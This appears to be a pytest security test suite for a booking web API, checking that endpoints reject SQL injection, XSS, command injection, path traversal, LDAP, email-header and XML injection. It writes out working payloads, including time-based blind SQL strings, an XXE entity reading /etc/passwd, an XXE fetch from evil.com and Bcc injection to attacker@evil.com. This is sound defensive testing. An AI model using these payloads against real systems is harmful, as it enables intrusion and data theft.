"""
Input Validation & Injection Attack Security Tests
Tests for protection against various injection attacks and input validation vulnerabilities
"""

import pytest
import json
import os
import time
import tempfile
from urllib.parse import quote, unquote


class TestSQLInjectionProtection:
    """Test SQL injection protection across all endpoints"""
    
    def test_sql_injection_in_search(self, security_client, sql_injection_payloads):
        """Test SQL injection protection in search functionality"""
        for payload in sql_injection_payloads:
            # Test search endpoint
            response = security_client.get(f'/api/items?search={quote(payload)}')
            
            # Should handle SQL injection attempts safely
            assert response.status_code in [200, 400, 404], f"SQL injection in search handled safely: {payload}"
            
            if response.status_code == 200:
                try:
                    data = json.loads(response.data)
                    # If successful, should not return excessive data (indicating injection success)
                    if isinstance(data, list):
                        assert len(data) < 1000, f"Potential SQL injection success with payload: {payload}"
                except json.JSONDecodeError:
                    # If response isn't JSON, that's also acceptable for malicious input
                    pass
    
    def test_sql_injection_in_filters(self, security_client, sql_injection_payloads):
        """Test SQL injection protection in filter parameters"""
        filter_params = ['category', 'price_min', 'price_max', 'availability']
        
        for param in filter_params:
            for payload in sql_injection_payloads:
                response = security_client.get(f'/api/items?{param}={quote(payload)}')
                
                # Should handle malicious filter parameters safely
                assert response.status_code in [200, 400, 404], f"SQL injection in {param} filter handled safely: {payload}"
                
                # Check response doesn't contain error messages
                if response.status_code == 200:
                    response_text = response.data.decode()
                    sql_error_indicators = ['sql', 'mysql', 'postgres', 'sqlite', 'syntax error', 'ora-']
                    
                    for indicator in sql_error_indicators:
                        assert indicator not in response_text.lower(), f"SQL error exposed with {param}={payload}"
    
    def test_sql_injection_in_booking_creation(self, security_client, sql_injection_payloads):
        """Test SQL injection protection in booking creation"""
        for payload in sql_injection_payloads:
            booking_data = {
                'item_id': payload,
                'start_date': '2025-09-10',
                'end_date': '2025-09-12',
                'customer_name': payload,
                'customer_email': f'test_{hash(payload) % 1000}@example.com',
                'customer_phone': payload,
                'notes': payload
            }
            
            response = security_client.post('/api/bookings', json=booking_data)
            
            # Should handle malicious input appropriately (may require auth)
            assert response.status_code in [400, 401, 404, 422], f"SQL injection in booking handled safely: {payload}"
    
    def test_blind_sql_injection_protection(self, security_client):
        """Test protection against blind SQL injection attacks"""
        # Time-based blind SQL injection payloads
        time_based_payloads = [
            "1; WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' || pg_sleep(5)--",
            "1'; SELECT pg_sleep(5)--"
        ]
        
        for payload in time_based_payloads:
            start_time = time.time()
            response = security_client.get(f'/api/items/{quote(payload)}')
            end_time = time.time()
            
            # Response should not be delayed (indicating SQL execution)
            response_time = end_time - start_time
            assert response_time < 2.0, f"Potential blind SQL injection with payload: {payload}"
            assert response.status_code in [400, 404], f"Blind SQL injection payload processed: {payload}"


class TestXSSProtection:
    """Test Cross-Site Scripting (XSS) protection"""
    
    def test_reflected_xss_protection(self, security_client, xss_payloads):
        """Test protection against reflected XSS attacks"""
        for payload in xss_payloads:
            # Test in search parameter
            response = security_client.get(f'/api/items?search={quote(payload)}')
            
            if response.status_code == 200:
                response_text = response.data.decode()
                
                # Payload should be properly encoded/escaped
                assert '<script>' not in response_text, f"XSS payload not escaped: {payload}"
                assert 'javascript:' not in response_text, f"JavaScript protocol not blocked: {payload}"
                assert 'onerror=' not in response_text, f"Event handler not escaped: {payload}"
    
    def test_stored_xss_protection(self, security_client, xss_payloads):
        """Test protection against stored XSS attacks"""
        for payload in xss_payloads:
            # Attempt to store XSS payload in booking
            booking_data = {
                'item_id': 1,
                'start_date': '2025-09-10',
                'end_date': '2025-09-12',
                'customer_name': payload,
                'customer_email': 'test@example.com',
                'notes': payload
            }
            
            create_response = security_client.post('/api/bookings', json=booking_data)
            
            if create_response.status_code in [200, 201]:
                # Retrieve the booking to check if XSS payload is escaped
                booking_id = json.loads(create_response.data).get('id')
                if booking_id:
                    get_response = security_client.get(f'/api/bookings/{booking_id}')
                    
                    if get_response.status_code == 200:
                        response_text = get_response.data.decode()
                        
                        # XSS payload should be properly escaped
                        assert '<script>' not in response_text, f"Stored XSS vulnerability: {payload}"
                        assert 'javascript:' not in response_text, f"JavaScript protocol stored: {payload}"
    
    def test_dom_xss_protection(self, security_client):
        """Test DOM-based XSS protection"""
        # Test URL fragments and parameters that might be processed client-side
        dom_payloads = [
            '#<script>alert("DOM XSS")</script>',
            '?callback=<script>alert("JSONP XSS")</script>',
            '&redirect=javascript:alert("Redirect XSS")'
        ]
        
        for payload in dom_payloads:
            response = security_client.get(f'/api/items{payload}')
            
            # Should handle malicious fragments safely
            assert response.status_code in [200, 400, 404], f"DOM XSS payload caused error: {payload}"


class TestCommandInjectionProtection:
    """Test command injection protection"""
    
    def test_command_injection_in_file_operations(self, security_client, command_injection_payloads):
        """Test protection against command injection in file operations"""
        for payload in command_injection_payloads:
            # Test with malicious input in request parameters
            response = security_client.post('/api/items', json={
                'name': payload,
                'description': 'test item'
            })
            
            # Should handle malicious input safely
            assert response.status_code in [400, 401, 403, 404, 422], f"Command injection handled safely: {payload}"
    
    def test_command_injection_in_search(self, security_client, command_injection_payloads):
        """Test protection against command injection in search functionality"""
        for payload in command_injection_payloads:
            response = security_client.get(f'/api/items?search={quote(payload)}')
            
            # Should handle command injection attempts safely
            assert response.status_code in [200, 400, 404], f"Command injection in search handled safely: {payload}"
            
            if response.status_code == 200:
                response_text = response.data.decode()
                
                # Should not contain command output indicators
                command_indicators = ['total ', 'directory of', 'volume serial', 'users currently logged']
                for indicator in command_indicators:
                    assert indicator not in response_text.lower(), f"Command execution detected: {payload}"


class TestPathTraversalProtection:
    """Test path traversal attack protection"""
    
    def test_path_traversal_in_file_access(self, security_client, path_traversal_payloads):
        """Test protection against path traversal in file access"""
        for payload in path_traversal_payloads:
            # Test file download endpoint
            response = security_client.get(f'/api/files/{quote(payload, safe="")}')
            
            # Should not allow path traversal
            assert response.status_code in [400, 403, 404], f"Path traversal not blocked: {payload}"
            
            if response.status_code == 200:
                response_text = response.data.decode()
                
                # Should not contain system file contents
                system_file_indicators = ['root:x:', 'localhost', '[drivers]', 'etc/passwd']
                for indicator in system_file_indicators:
                    assert indicator not in response_text, f"System file accessed via: {payload}"
    
    def test_path_traversal_in_image_serving(self, security_client, path_traversal_payloads):
        """Test protection against path traversal in image serving"""
        for payload in path_traversal_payloads:
            response = security_client.get(f'/api/images/{quote(payload, safe="")}')
            
            # Should reject path traversal attempts
            assert response.status_code in [400, 403, 404], f"Path traversal in images: {payload}"
    
    def test_null_byte_injection(self, security_client):
        """Test protection against null byte injection"""
        null_byte_payloads = [
            'legitimate.txt\x00.exe',
            'file.pdf\x00.php',
            'image.jpg\x00.jsp'
        ]
        
        for payload in null_byte_payloads:
            response = security_client.get(f'/api/files/{quote(payload, safe="")}')
            
            # Should not be vulnerable to null byte injection
            assert response.status_code in [400, 403, 404], f"Null byte injection: {payload}"


class TestInputValidationSecurity:
    """Test comprehensive input validation security"""
    
    def test_buffer_overflow_protection(self, security_client, security_test_data):
        """Test protection against buffer overflow attacks"""
        oversized_data = security_test_data['oversized_data']
        
        # Test oversized input in various fields
        test_cases = [
            {'endpoint': '/api/bookings', 'method': 'POST', 'data': {'customer_name': oversized_data}},
            {'endpoint': '/api/items', 'method': 'GET', 'params': {'search': oversized_data}},
            {'endpoint': '/api/auth/login', 'method': 'POST', 'data': {'email': oversized_data}}
        ]
        
        for case in test_cases:
            if case['method'] == 'POST':
                response = security_client.post(case['endpoint'], json=case['data'])
            else:
                response = security_client.get(case['endpoint'], query_string=case.get('params', {}))
            
            # Should handle oversized input appropriately
            assert response.status_code in [200, 400, 401, 404, 413, 422], f"Buffer overflow handled appropriately: {case['endpoint']}"
    
    def test_unicode_attack_protection(self, security_client, security_test_data):
        """Test protection against Unicode-based attacks"""
        unicode_attacks = security_test_data['unicode_attacks']
        
        for attack in unicode_attacks:
            # Test in various input fields
            response = security_client.post('/api/bookings', json={
                'customer_name': f'Test{attack}User',
                'customer_email': f'test{attack}@example.com',
                'notes': f'Notes with {attack} character'
            })
            
            # Should handle Unicode attacks appropriately
            assert response.status_code in [200, 201, 400, 401, 404, 422], f"Unicode attack handled appropriately: {repr(attack)}"
    
    def test_file_type_validation(self, security_client, security_test_data):
        """Test file type validation concepts"""
        # Test with various file extension attempts
        malicious_extensions = ['.exe', '.bat', '.cmd', '.php', '.jsp', '.asp']
        
        for ext in malicious_extensions:
            # Test by attempting to create items with malicious filenames
            response = security_client.post('/api/items', json={
                'name': f'test_file{ext}',
                'description': 'test item'
            })
            
            # Should handle requests appropriately (may require auth)
            assert response.status_code in [400, 401, 403, 404, 415, 422], f"Malicious extension handled: {ext}"
    
    def test_email_injection_protection(self, security_client):
        """Test protection against email header injection"""
        email_injection_payloads = [
            'test@example.com\nBcc: attacker@evil.com',
            'test@example.com\r\nTo: victim@target.com',
            'test@example.com%0aBcc: evil@hacker.com',
            'test@example.com\nSubject: Injected Subject'
        ]
        
        for payload in email_injection_payloads:
            response = security_client.post('/api/contact', json={
                'email': payload,
                'message': 'Test message'
            })
            
            # Should handle email injection attempts appropriately
            assert response.status_code in [400, 404, 422], f"Email injection handled appropriately: {payload}"
    
    def test_ldap_injection_protection(self, security_client):
        """Test protection against LDAP injection"""
        ldap_injection_payloads = [
            'admin)(|(password=*))',
            '*)(objectClass=*',
            '*)|(mail=*',
            'admin)(&(password=*)',
            '*)(cn=*)'
        ]
        
        for payload in ldap_injection_payloads:
            response = security_client.post('/api/auth/login', json={
                'email': payload,
                'password': 'test123'
            })
            
            # Should handle LDAP injection attempts appropriately  
            assert response.status_code in [400, 401, 404], f"LDAP injection handled appropriately: {payload}"
    
    def test_xml_injection_protection(self, security_client):
        """Test protection against XML injection attacks"""
        xml_payloads = [
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/evil.xml">]><test>&xxe;</test>',
            '<script xmlns="http://www.w3.org/1999/xhtml">alert("XSS")</script>'
        ]
        
        for payload in xml_payloads:
            # Test XML input in various endpoints
            response = security_client.post('/api/import', 
                                          data=payload, 
                                          headers={'Content-Type': 'application/xml'})
            
            # Should handle malicious XML appropriately
            assert response.status_code in [400, 403, 404, 415, 422], f"XML injection handled appropriately: {payload[:50]}..."
